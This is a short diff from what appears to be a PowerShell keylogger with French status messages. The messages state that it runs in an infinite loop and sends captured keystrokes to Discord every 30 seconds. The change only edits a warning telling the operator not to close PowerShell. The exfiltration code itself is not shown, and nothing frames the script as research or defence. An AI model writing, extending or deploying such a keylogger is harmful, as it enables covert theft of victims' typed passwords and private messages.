@@ -41,7 +41,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     $sendInterval = 30
     Write-Host "KeyLogger demarre en mode INFINI" -ForegroundColor Green
     Write-Host "Envoi sur Discord toutes les 30 sec" -ForegroundColor Yellow
-     Write-Host "NE PAS " -ForegroundColor Yellow
+     Write-Host "NE PAS FERMER LE POWERSHELL SINON SA MARCHE PLUS !!!" -ForegroundColor Red
 
 
     while ($true) {
